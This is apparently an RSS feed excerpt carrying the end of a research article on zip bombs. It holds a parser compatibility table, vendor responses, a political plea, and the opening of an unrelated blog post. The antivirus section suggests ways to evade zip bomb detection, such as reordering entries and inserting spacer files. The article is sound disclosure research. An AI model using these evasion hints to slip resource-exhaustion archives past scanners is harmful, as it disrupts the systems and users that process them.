<a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/pellegrino">may not match</a>
(§4.2.2)
the actual uncompressed sizes.
(See the "permits too-short file size" row in <a href="#compatibility">the compatibility table</a>.)
Robust protection against zip bombs
involves sandboxing the parser to limit
its use of time, memory, and disk space—just
as if you were processing image files,
or any other complex file format prone to parser bugs.
</p>

<table id="compatibility">

<caption>
<p>
Compatibility of selected zip parsers with various zip features,
edge cases,
and zip bomb constructions.
The background colors indicate a scale from <span>less restrictive to more restrictive</span>.
For best compatibility,
use DEFLATE compression without Zip64,
match names in central directory headers and local file headers,
compute correct CRCs,
and avoid the maximum values of 32-bit and 16-bit fields.
</p>
</caption>

<!--
Open Packaging Conventions:
DEFLATE: yes (Table (C-3)
Zip64: yes (Table C-1, Table C-3)
bzip2: no (Table C-3)
permits mismatched filenames: no (C.1 Archive File Header Consistency)
permits incorrect CRC-32: unknown
permits file size of 0xffffffff: unknown
permits file count of 0xffff: unknown
https://www.ecma-international.org/news/TC45_current_work/Office%20Open%20XML%20Part%202%20-%20Open%20Packaging%20Conventions.pdf
-->

<!--
$ git clone https://android.googlesource.com/platform/system/core
$ cd core
$ git checkout android-9.0.0_r1
$ g++ -o unzip -std=c++17 -Iinclude -Ibase/include -Iliblog/include -Ilibutils/include -Ilibziparchive/include libziparchive/{zip_archive.cc,unzip.cpp} base/{strings.cpp,file.cpp,logging.cpp,stringprintf.cpp} libutils/FileMap.cpp libunwindstack/tests/LogFake.cpp -lz
-->

<thead>
<tr>
<td></td>
<th><a href="http://infozip.sourceforge.net/UnZip.html">Info-ZIP<br>UnZip 6.0</a></th>
<th><a href="https://docs.python.org/3/library/zipfile.html">Python 3.7<br>zipfile</a></th>
<th><a href="https://golang.org/pkg/archive/zip/">Go 1.12<br>archive/zip</a></th>
<th><a href="https://github.com/thejoshwolfe/yauzl">yauzl 2.10.0<br>(Node.js)</a></th>
<th><a href="https://github.com/jbangert/nail/tree/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip">Nail<br>examples/zip</a></th>
<th><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive">Android&nbsp;9.0.0&nbsp;r1<br>libziparchive</a></th>
<th><a href="https://github.com/madler/sunzip">sunzip 0.4</a><br>(streaming)</th>
</tr>
</thead>

<tbody>

<!--
<td class= title=></td>
<td class=y title=yes>✓</td>
<td class=n title=no>✖</td>
-->

<tr>
<th>DEFLATE</th>
<td title="yes">✓</td>
<td title="yes"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L57">✓</a></td>
<td title="yes"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/struct.go#L31">✓</a></td>
<td title="yes"><a href="https://github.com/thejoshwolfe/yauzl/blob/2.10.0/index.js#L520-L521">✓</a></td>
<td title="yes"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.c#L63">✓</a></td>
<td title="yes"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#1059">✓</a></td>
<td title="yes"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1256">✓</a></td>
</tr>

<tr>
<th>Zip64</th>
<td title="yes"><a href="http://infozip.sourceforge.net/UnZip.html#Release">✓</a></td>
<td title="yes"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L186">✓</a></td>
<td title="yes"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L519">✓</a></td>
<td title="limited to the range of IEEE doubles"><a href="https://github.com/thejoshwolfe/yauzl/tree/2.10.0#limitted-zip64-support">✓</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.c#L103-L125">✖</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#168">✖</a></td>
<td title="yes"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L922">✓</a></td>
</tr>

<tr>
<th>bzip2</th>
<td title="yes"><a href="http://infozip.sourceforge.net/UnZip.html#Release">✓</a></td>
<td title="yes"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L58">✓</a></td>
<td title="unless you provide an implementation with RegisterDecompressor"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/struct.go#L28-L32">✖</a></td>
<td title="no"><a href="https://github.com/thejoshwolfe/yauzl/blob/2.10.0/index.js#L517-L525">✖</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.c#L86">✖</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#1061">✖</a></td>
<td title="yes"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1256">✓</a></td>
</tr>

<tr>
<th>permits mismatched filenames</th>
<td title="warns, then takes name from central directory">warns</td>
<td><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L1486-L1489"><abbr title="no">✖</abbr></a></td>
<td title="ignores local file header metadata"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L244">✓</a></td>
<td title="ignores local file header metadata"><a href="https://github.com/thejoshwolfe/yauzl/tree/2.10.0#local-file-headers-are-ignored">✓</a></td>
<td title="with a TODO to add the check"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L49">✓</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#594">✖</a></td>
<td title="ignores local file header filename"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1268-L1269">✓</a></td>
</tr>

<tr>
<th>permits incorrect CRC-32</th>
<td><abbr title="shows expected and actual CRC">warns</abbr></td>
<td title="no"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L893-L894">✖</a></td>
<td title="CRC-32 ignored if set to 0"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L219-L224">if zero</a></td>
<td title="yes"><a href="https://github.com/thejoshwolfe/yauzl/tree/2.10.0#no-crc-32-checking">✓</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L41">✖</a></td>
<td title="with a compile-time bool to enable CRC checks; but does check for consistency between CDH CRC and data descriptor CRC"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#52">✓</a></td>
<td title="no"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1113-L1124">✖</a></td>
</tr>

<tr>
<th>permits too-short file size</th>
<td title="yes">✓</td>
<td title="permits uncompressed size field to be longer, but not shorter, than the actual size"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L772">✖</a></td>
<td title="no"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L205-L207">✖</a></td>
<td title="no"><a href="https://github.com/thejoshwolfe/yauzl/blob/2.10.0/index.js#L641-L655">✖</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L47">✖</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#847">✖</a></td>
<td title="no"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1113-L1124">✖</a></td>
</tr>

<tr>
<th>permits file size of 2<sup>32</sup>&nbsp;−&nbsp;1</th>
<td title="yes">✓</td>
<td title="0xffffffff not treated as special"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L1311-L1313">✓</a></td>
<td title="special case to allow file size of 0xffffffff, still disallows compressed size or local file header offset of 0xffffffff"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L406-L414">✓</a></td>
<td title="requires Zip64 Extended Information extra field when file size is 0xffffffff"><a href="https://github.com/thejoshwolfe/yauzl/issues/109">✖</a></td>
<td title="no Zip64 support"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L59">✓</a></td>
<td title="no Zip64 support"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive_common.h#95">✓</a></td>
<td title="checks for Zip64 Extended Information extra field if file size is 0xffffffff, but does not require it"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1275-L1277">✓</a></td>
</tr>

<tr>
<th>permits file count of 2<sup>16</sup>&nbsp;−&nbsp;1</th>
<td title="checks for Zip64 end of central directory locator independent of file count">✓</td>
<td title="checks for Zip64 end of central directory locator independent of file count"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L258-L259">✓</a></td>
<td title="looks for Zip64 end of central directory locator, but continues if not present"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L502-L511">✓</a></td>
<td title="no"><a href="https://github.com/thejoshwolfe/yauzl/issues/108">✖</a></td>
<td title="no Zip64 support"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L79">✓</a></td>
<td title="no Zip64 support"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive_common.h#51">✓</a></td>
<td title="Zip64 end of central directory locator is optional"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1139">✓</a></td>
</tr>
</tbody>

<tbody>
<!--
<tr>
<th>unzips recursively (42.zip)</th>
<td class=n title=no>✖</td>
<td class=n title=no>✖</td>
<td class=na title="is a library">N/A</td>
<td class=na title="is a library">N/A</td>
<td class=n title=no>✖</td>
<td class=n title=no>✖</td>
<td class=n title=no>✖</td>
</tr>
-->

<tr>
<th>unzips <a href="#overlap">overlap.zip</a></th>
<td>warns</td>
<td title="no">✖</td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="no">✖</td>
<td title="no">✖</td>
</tr>

<tr>
<th>unzips <a href="#allocation">zbsm.zip and zblg.zip</a></th>
<td><abbr title="yes">✓</abbr></td>
<td><abbr title="yes">✓</abbr></td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="crashes because it tries to extract all into memory, but handles the construction">✓</td>
<td title="yes">✓</td>
<td title="no">✖</td>
</tr>

<tr>
<th>unzips <a href="#zip64">zbxl.zip</a></th>
<td><abbr title="yes">✓</abbr></td>
<td><abbr title="yes">✓</abbr></td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="no Zip64 support">✖</td>
<td title="no Zip64 support">✖</td>
<td title="no">✖</td>
</tr>
</tbody>

</table>

</section>

<section id="credits">
<h2>Credits</h2>

<p>
I&nbsp;thank
<a href="https://madler.net/madler/">Mark Adler</a>,
<a href="https://bburky.com/">Blake Burkhart</a>,
<a href="https://gynvael.coldwind.pl/">Gynvael Coldwind</a>,
<a href="https://swtch.com/~rsc/">Russ Cox</a>,
<a href="https://www.brandonenright.net/">Brandon Enright</a>,
<a href="https://github.com/jorangreef">Joran Dirk Greef</a>,
<a href="https://idea.popcount.org/">Marek Majkowski</a>,
<a href="https://wolfesoftware.com/">Josh Wolfe</a>,
and the <a href="https://www.usenix.org/conference/woot19/">USENIX WOOT 2019</a> reviewers
for comments on this article or a draft.
Caolán McNamara evaluated the security impact
of the zip bombs in LibreOffice.
<a href="https://habr.com/users/m1rko/">@m1rko</a>
wrote a <a href="https://habr.com/ru/post/459254/">Russian translation</a>.
<a href="https://zerosun.top/">北岸冷若冰霜</a>
wrote a <a href="https://zerosun.top/2019/07/07/A-better-zip-bomb/">Chinese translation</a>.
Daniel Ketterer reported that the <code>--template</code> option
was broken after the addition of <a href="#giant-steps"><code>--giant-steps</code></a>.
</p>

<p>
A&nbsp;version of this article
appeared at the
<a href="https://www.usenix.org/conference/woot19/presentation/fifield">USENIX WOOT 2019</a>
workshop.
The workshop talk
<a href="https://www.bamsoftware.com/talks/woot19-zipbomb/">video, slides, and transcript</a>
are available.
The <a href="#source">source code</a> of the paper is available.
The <a href="https://www.usenix.org/conference/woot19/call-for-artifacts">artifacts</a>
prepared for submission are <a href="https://www.bamsoftware.com/hacks/zipbomb/zipbomb-woot19.zip">zipbomb-woot19.zip</a>.
</p>

<p>
Did you find a system that chokes on one of these zip bombs?
Did they help you demonstrate a vulnerability or
win a bug bounty?
<a href="#contact">Let me know</a> and I'll try to mention it here.
</p>

<dl>
<dt id="libreoffice">LibreOffice 6.1.5.2</dt>
<dd>
<p>
zblg.zip renamed to zblg.odt or zblg.docx
will cause LibreOffice to
create and delete a number of ~4&nbsp;GB temporary files
as it attempts to determine the file format.
It does eventually finish, and it deletes
the temporary files as it goes,
so it's only a temporary DoS that doesn't fill up the disk.
Caolán McNamara replied to my bug report.
</p>
</dd>
<dt id="addons-server">Mozilla addons-server 2019.06.06</dt>
<dd>
<p>
I tried the zip bombs against a local installation of addons-server,
which is part of the software behind addons.mozilla.org.
The system handles it gracefully,
imposing a <a href="https://github.com/mozilla/addons-server/blob/2019.06.06/src/olympia/lib/settings_base.py#L1457-L1458">time limit</a>
of <time datetime="110s">110&nbsp;s</time> on extraction.
The zip bomb expands as fast as the disk will let it up to the time limit,
but after that point the process is killed and the unzipped files
are eventually automatically cleaned up.
</p>
</dd>
<dt id="unzip">UnZip 6.0</dt>
<dd>
<p>
Mark Adler wrote
<a href="https://github.com/madler/unzip/commits/6519bf0f8a896851d9708da11e1b63c818238c8f">a patch</a>
for UnZip to detect this class of zip bomb.
</p>
<p>
<time>2019-07-05</time>:
I noticed that <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13232">CVE-2019-13232</a>
was assigned for UnZip.
Personally, I would dispute that UnZip's (or any zip parser's)
ability to process a zip bomb of the kind discussed here
necessarily represents a security vulnerability, or even a bug.
It's a natural implementation and does not violate the specification
in any way that I can tell.
The type discussed in this article is only one type of zip bomb,
and there are many ways in which zip parsing can go wrong that are not bombs.
If you want to defend against resource exhaustion attacks,
you should <em>not</em> try to enumerate, detect, and block
every individual known attack;
rather you should impose external limits on time and other resources
so that the parser cannot misbehave too much,
no matter what kind of attack it faces.
There is nothing wrong with attempting to detect and reject certain
constructions as a first-pass optimization,
but you can't stop there.
If you do not eventually isolate and limit
operations on untrusted data, your system is likely still vulnerable.
Consider an analogy with <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">cross-site scripting</a> in HTML:
the right defense is not to try and filter out bytes that may be interpreted as code,
it's to escape everything properly.
</p>
<p>
Mark Adler's patch made its way into Debian in
<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=931433">bug&nbsp;#931433</a>.
<!-- Debian 8 "Jessie" https://lists.debian.org/debian-lts-announce/2019/07/msg00005.html -->
There were some unanticipated consequences:
problems parsing certain Java JARs
(<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=931895">bug #931895</a>)
and problems with the mutant zip format of Firefox's omni.ja file
(<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=932404">bug #932404</a>).
SUSE decided
<a href="https://bugzilla.suse.com/show_bug.cgi?id=1140748#c2">not to do anything</a>
about CVE-2019-13232.
I think both Debian's and SUSE's choices are defensible.
</p>
<!-- https://bugzilla.redhat.com/show_bug.cgi?id=1727761 -->
<!-- https://bugs.gentoo.org/691566 -->
</dd>
<dt id="ronomon">ronomon/zip</dt>
<dd>
<p>
Shortly after the publication of this article,
Joran Dirk Greef published a
<a href="https://github.com/ronomon/zip">restrictive zip parser</a> (JavaScript)
that prohibits irregularities such as overlapping files
or unused space between files.
While it may thereby reject certain valid zip files,
the idea is to ensure that any downstream parsers
will receive only clean, easy-to-parse files.
</p>
</dd>
<dt id="antivirus">antivirus engines</dt>
<dd>
<p>
Overall, it seems that malware scanners have slowly begun
to recognize zip bombs of this kind
(or at least the specific samples available for download)
as malicious.
It would be interesting to see whether the detection is robust or brittle.
You could reverse the order of the entries in the central directory, for example,
and see whether the zip files are still detected.
In the <a href="#source">source code</a>,
there's a recipe for generating zbsm.extra.zip,
which is like zbsm.zip except that it uses
<a href="#extra">extra-field quoting</a> instead of
<a href="#quote">DEFLATE quoting</a>—if you are a customer
of an AV service that detects zbsm.zip but not zbsm.extra.zip,
you should ask for an explanation.
Another simple variant is
<a href="https://www.bamsoftware.com/hacks/zipbomb/spacer.txt">inserting spacer files between the bomb files</a>,
which may fool certain overlap-detection algorithms.
</p>
<p>
Twitter user @TVqQAAMAAAAEAAA
<a href="https://twitter.com/TVqQAAMAAAAEAAA/status/1146351962486476801">reports</a>
<!-- https://web.archive.org/web/20190703141828/https:/twitter.com/TVqQAAMAAAAEAAA/status/1146351962486476801 -->
"McAfee AV on my test machine just exploded."
I haven't independently confirmed it, nor do I have details such as a version number.
</p>
<p>
Tavis Ormandy <a href="https://twitter.com/taviso/status/1146477576132542466">points out</a>
<!-- https://web.archive.org/web/20190707044306/https://twitter.com/taviso/status/1146477576132542466 -->
that there are a number of "Timeout" results in
<a href="https://www.virustotal.com/gui/file/f1dc920869794df3e258f42f9b99157104cd3f8c14394c1b9d043d6fcda14c0a/detection">the VirusTotal for zblg.zip</a>
<small><a href="https://www.bamsoftware.com/hacks/zipbomb/vt-zblg-20190706.png">(screenshot <time>2019-07-06</time>)</a></small>.
<!-- Nor wayback machine nor archive.is worked on the virustotal site :(
https://web.archive.org/web/20190705165359/https://www.virustotal.com/gui/file/f1dc920869794df3e258f42f9b99157104cd3f8c14394c1b9d043d6fcda14c0a/detection
https://web.archive.org/web/20190705170818/https://www.virustotal.com/gui/file/fb4ff972d21189beec11e05109c4354d0cd6d3b629263d6c950cf8cc3f78bd99/detection
https://web.archive.org/web/20190705170924/https://www.virustotal.com/gui/file/eafd8f574ea7fd0f345eaa19eae8d0d78d5323c8154592c850a2d78a86817744/detection
-->
<!-- but the old-browsers mode kinda works
https://www.virustotal.com/old-browsers/file/fb4ff972d21189beec11e05109c4354d0cd6d3b629263d6c950cf8cc3f78bd99
http://archivecaslytosk.onion/sgvC9

https://www.virustotal.com/old-browsers/file/f1dc920869794df3e258f42f9b99157104cd3f8c14394c1b9d043d6fcda14c0a
http://archivecaslytosk.onion/ywtHj

https://www.virustotal.com/old-browsers/file/eafd8f574ea7fd0f345eaa19eae8d0d78d5323c8154592c850a2d78a86817744
http://archivecaslytosk.onion/Xz7q3
-->
AhnLab-V3, ClamAV, DrWeb, Endgame, F-Secure, GData, K7AntiVirus, K7GW, MaxSecure, McAfee, McAfee-GW-Edition, Panda, Qihoo-360, Sophos ML, VBA32.
<a href="https://www.virustotal.com/gui/file/fb4ff972d21189beec11e05109c4354d0cd6d3b629263d6c950cf8cc3f78bd99/detection">The results for zbsm.zip</a>
<small><a href="https://www.bamsoftware.com/hacks/zipbomb/vt-zbsm-20190706.png">(screenshot <time>2019-07-06</time>)</a></small>
are similar, though with a different set of timed-out engines:
Baido, Bkav, ClamAV, CMC, DrWeb, Endgame, ESET-NOD32, F-Secure, GData, Kingsoft, McAfee-GW-Edition, NANO-Antivirus, Acronis.
Interestingly, there are no timeouts in
<a href="https://www.virustotal.com/gui/file/eafd8f574ea7fd0f345eaa19eae8d0d78d5323c8154592c850a2d78a86817744/detection">the results for zbxl.zip</a>;
<small><a href="https://www.bamsoftware.com/hacks/zipbomb/vt-zbxl-20190706.png">(screenshot <time>2019-07-06</time>)</a></small>
perhaps this means that some antivirus doesn't support Zip64?
</p>
<p>
Forum user 100 <a href="https://forum.eset.com/topic/20123-zip-bombs-with-zip64-not-detected/">reported</a>
that a certain ESET product did not detect zbxl.zip, possibly because it uses Zip64.
An update in the thread three days later showed the product being updated to detect it.
</p>
<p>
In <a href="https://bugzilla.clamav.net/show_bug.cgi?id=12356">ClamAV bug 12356</a>,
Hanno Böck reported that zblg.zip caused high CPU usage
in clamscan.
<a href="https://bugzilla.clamav.net/show_bug.cgi?id=12356#c5">An initial patch</a>
to detect overlapping files
<a href="https://seclists.org/oss-sec/2019/q3/121">turned out to be incomplete</a>
because it only checked adjacent pairs of files.
(I personally mishandled this issue
by posting details of a workaround on the bug tracker,
instead of reporting it privately.)
<a href="https://bugzilla.clamav.net/show_bug.cgi?id=12356#c14">A later patch</a>
imposed a time limit on file analysis.
</p>
<p id="flytech">
<time>2020-07-28</time>: FlyTech Videos presented a
<a href="https://www.youtube.com/watch?v=peeYOqejWfg">video testing various zip bombs</a>,
including <a href="#zbxl">zbxl.zip</a>,
against Windows Defender, Windows Explorer, and 7-zip.
</p>
<p>
In my web server logs, I noticed a number of referers that
appear to point to bug trackers.
</p>
<ul>
<li>http://jira.athr.ru/browse/WEB-12882</li>
<li>https://project.avira.org/browse/ENGINE-2307</li>
<li>https://project.avira.org/browse/ENGINE-2363</li>
<li>https://topdesk-imp.cicapp.nl/tas/secure/mango/window/4</li>
<li>https://jira-eng-rtp3.cisco.com/jira/browse/AMP4E-4849</li>
<li>https://jira-eng-sjc1.cisco.com/jira/browse/CLAM-965</li>
<li>https://flightdataservices.atlassian.net/secure/RapidBoard.jspa?selectedIssue=FDS-136</li>
<li>https://projects.ucd.gpn.gov.uk/browse/VULN-1483</li>
<li>https://testrail-int.qa1.immunet.com/index.php?/cases/view/923720</li>
<li>http://redmine-int-prod.intranet.cnim.net/issues/5596</li>
<li>https://bugs.drweb.com/view.php?id=159759</li>
<li>https://dev-jira.dynatrace.org/browse/APM-188227</li>
<li>https://webgate.ec.europa.eu/CITnet/jira/browse/EPREL-2150</li>
<li>https://jira.egnyte-it.com/browse/IN-8480</li>
<li>https://jira.hq.eset.com/browse/CCDBL-1492</li>
<li>https://bugzilla.olympus.f5net.com/show_bug.cgi?id=819053</li>
<li>https://mantis.fortinet.com/bug_view_page.php?bug_id=0570222</li>
<li>https://redmine.joesecurity.org:64998/issues/4705</li>
<li>http://dev.maildev.jp/mantis/view.php?id=5839</li>
<li>https://confluence.managed.lu/pages/viewpage.action?pageId=47974242</li>
<li>https://jira-lvs.prod.mcafee.com/browse/TSWS-653</li>
<li>https://jira.modulbank.ru/browse/PV-33012</li>
<li>http://jira.netzwerk.intern:8080/browse/SALES-81</li>
<li>https://jira-hq.paloaltonetworks.local/browse/CON-43391</li>
<li>https://jira-hq.paloaltonetworks.local/browse/GSRT-11680</li>
<li>https://jira-hq.paloaltonetworks.local/browse/PAN-124201</li>
<li>https://paynearme.atlassian.net/browse/PNM-4494</li>
<li>https://jira.proofpoint.com/jira/browse/PE-29410</li>
<li>https://dev.pulsesecure.net/jira/browse/PRS-379163</li>
<li>https://qualtrics.atlassian.net/browse/APP-326</li>
<li>https://jira.sastdev.net/browse/CIS-2819</li>
<li>https://jira.sastdev.net/secure/RapidBoard.jspa?selectedIssue=EC-709</li>
<li>https://bugzilla.seeburger.de/show_bug.cgi?id=89294</li>
<li>https://svm.cert.siemens.com/auseno/create_edit_vulnerability.php?vulnid=48573</li>
<li>https://jira.sophos.net/browse/CPISSUE-6560</li>
<li>https://jira.vrt.sourcefire.com/browse/TT-1070</li>
<li>https://task.jarvis.trendmicro.com/browse/JPSE-10432</li>
<li>https://segjira.trendmicro.com:8443/browse/SEG-55636</li>
<li>https://segjira.trendmicro.com:8443/browse/SEG-58824</li>
<li>https://ucsc-cgl.atlassian.net/secure/RapidBoard.jspa?selectedIssue=SEAB-327</li>
<li>https://jira.withbc.com/browse/BC-43950</li>
<li>https://zscaler.zendesk.com/agent/tickets/849971</li>
</ul>
</dd>
<dt id="browsers">web browsers</dt>
<dd>
<p>
I didn't directly experience this myself,
but reports online say that Chrome and Safari may automatically unzip
files after downloading.
</p>
<ul>
<li><p><a href="https://habr.com/ru/post/459254/#comment_20369364">ittakir</a>: "Скачал самый маленький файл на 5GB, Chrome тут же начал его распаковывать, хотя его об этом не просили, ну и кушать процессор и диск." <i>"I downloaded the smallest file on 5GB, Chrome immediately began to unpack it, although it was not asked for it, well, to eat the processor and disk."</i></p></li>
<li><p><a href="https://old.reddit.com/r/programming/comments/c8ylxn/zblg_nonrecursive_zip_bomb_with_a_280000001_ratio/esrsxvi/">Rzah</a>: "Yet another reason why 'Open Safe files after downloading' is a stupid default setting for a web browser."</p></li>
</ul>
<p>
Chromium commit <a href="https://chromium.googlesource.com/chromium/src/+/f04d9b15bd1cba1433ad5453bc3ebff933d0e3bb">f04d9b15bd1cba1433ad5453bc3ebff933d0e3bb</a> is perhaps related:
</p>
<blockquote>
<p>
Add metrics detecting anomalously high ZIP compression ratios
</p>
<p>
It's possible for a single ZIP entry to be very large, even if we only
scan small ZIP archives. These metrics will measure how often that occurs.
</p>
</blockquote>
</dd>
<dt id="filesystems">filesystems</dt>
<dd>
<p>
Something I didn't anticipate:
unzipping one of the bombs on a compressed filesystem can be relatively safe.
</p>
<ul>
<li><p><a href="https://old.reddit.com/r/programming/comments/cbvqzu/the_most_clever_zip_bomb_ever_made_explodes_a/etkazxk/">flying_gel</a>:
"If I unzip this onto a compressed zfs dataset, will the resulting file be small? Edit: Just did a small test with a 42KB-&gt;5.5GB zip bomb. I ended up with 165MB worth of files so while just 3% of the full bomb, it's still a 4028 times inflation. ... I only have the standard LZ4 compression enabled, no dedup."</p></li>
</ul>
</dd>
<dt id="twitter">Twitter</dt>
<dd>
<p>
Links to this article had been widely shared on Twitter
since around <time>2019-07-02</time>,
but around <time>2019-07-20</time> it began showing
<a href="https://twitter.com/safety/unsafe_link_warning?unsafe_link=https://www.bamsoftware.com/hacks/zipbomb/">an "unsafe link" interstitial</a>
<small>(<a href="https://www.bamsoftware.com/hacks/zipbomb/twitter-unsafe.png">screenshot</a>, <a href="https://web.archive.org/web/20190721031831/https://twitter.com/safety/unsafe_link_warning?unsafe_link=https://www.bamsoftware.com/hacks/zipbomb/">archive</a>)</small>.
</p>
</dd>
<dt id="safebrowsing">Safe Browsing</dt>
<dd>
<p>
Sometime around <time>2019-07-23</time> it seems that this page,
and <em>every</em> page on a *.bamsoftware.com domain,
got added to the <a href="https://safebrowsing.google.com/">Safe Browsing</a>
service used by web browsers
to block malware and phishing sites.
<a href="https://transparencyreport.google.com/safe-browsing/search?url=bamsoftware.com">Site status check</a>,
<a href="https://www.bamsoftware.com/hacks/zipbomb/safebrowsing-www.bamsoftware.com-20190724.png">block page screenshot</a>.
From a few quick checks, it looks like pages on bamsoftware.com
have been demoted or delisted on the google.com search engine as well.
</p>
<p>
The Safe Browsing block is a bit annoying,
because it disrupted <a href="https://snowflake.torproject.org/">Snowflake</a>,
a completely unrelated service that happened to use the domain
snowflake-broker.bamsoftware.com, which did not even host any files
but was strictly a web API server.
See <a href="https://bugs.torproject.org/31230">#31230 Firefox addon blocked from agent by Google Safe Browsing service</a>.
</p>
<p>
The Safe Browsing block seemed to end
on or before
<a href="https://www.bamsoftware.com/hacks/zipbomb/transparencyreport.google-www.bamsoftware.com-20190816.png"><time>2019-08-16</time></a>.
</p>
</dd>
<dt id="xfinity">Xfinity xFi Protected Browsing</dt>
<dd>
<p>
On <time>2019-11-26</time>, I was informed
by Hooman Mohajeri Moghaddam
that the Comcast Xfinity xFi
<a href="https://www.vice.com/en_us/article/evm3qk/comcast-blocking-paypal-customers-say-forum-net-neutrality">"Protected Browsing"</a>
feature blocks the bamsoftware.com domain, including this page
(<a href="https://www.bamsoftware.com/hacks/zipbomb/xfinity-blockpage.png">screenshot</a>).
</p>
</dd>
<dt id="dlang">D std.zip</dt>
<dd>
<p>
The D programming language
<a href="https://issues.dlang.org/show_bug.cgi?id=20027">made a modification</a>
to the <a href="https://dlang.org/library/std/zip.html">std.zip module</a>
to detect overlapping files.
</p>
</dd>
<!-- https://issues.dlang.org/show_bug.cgi?id=20027 -->
<!-- https://github.com/golang/go/issues/33026 https://github.com/golang/go/issues/33036 -->

<dt id="ios">Apple iOS and iPadOS</dt>
<dd>
<p>
Dzmitry Plotnikau sent me a report saying that
a zip bomb could use up all cache storage
on iPhones running iOS 12 and 13, even if only opened using "Quick look."
The exhaustion of storage could have various side effects,
including misbehaving apps, deletion of local cloud files, and OS crashes,
in some cases requiring a factory reset to remedy.
The bug was mitigated in iOS 14.0
(and likely other, contemporaneous point release of iOS and iPadOS).
See <a href="https://support.apple.com/en-us/HT211850">HT211850</a>
under the "libarchive" heading.
</p>
</dd>
</dl>

</section>

<section id="plea">
<h2>A final plea</h2>

<p>
It's time to put an end to Facebook.
Working there is not ethically neutral:
every day that you go into work, you are doing something wrong.
If you have a Facebook account, delete it.
If you work at Facebook, quit.
</p>

<p>
And let us not forget that the National Security Agency
must be destroyed.
</p>

</section>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LLM Year in Review (297 pts)]]></title>
            <link>https://karpathy.bearblog.dev/year-in-review-2025/</link>
            <guid>46330726</guid>
            <pubDate>Fri, 19 Dec 2025 20:49:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://karpathy.bearblog.dev/year-in-review-2025/">https://karpathy.bearblog.dev/year-in-review-2025/</a>, See on <a href="https://news.ycombinator.com/item?id=46330726">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    

    

    
        

        <p>
            <i>
                <time datetime="2025-12-19T18:00Z">
    19 Dec, 2025
</time>
            </i>
        </p>
    

    <p><img src="https://bear-images.sfo2.cdn.digitaloceanspaces.com/karpathy/unnamed.webp" alt="unnamed"></p>
